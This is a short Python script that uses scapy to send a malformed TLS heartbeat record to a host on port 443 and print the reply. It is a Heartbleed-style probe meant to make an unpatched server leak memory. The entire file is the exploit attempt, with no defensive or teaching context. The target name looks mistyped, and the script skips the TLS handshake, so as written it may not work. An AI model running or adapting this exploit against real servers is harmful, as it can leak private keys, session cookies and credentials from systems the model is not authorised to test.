import scapy
from scapy.layers.ssl_tls import *

import socket

target = ('twww.google.com',443)

# create tcp socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(target)

p = TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=2**14-1,data='bleed...')

s.sendall(p)
resp = s.recv(1024)
print( "resp: %s"%repr(resp))
s.close()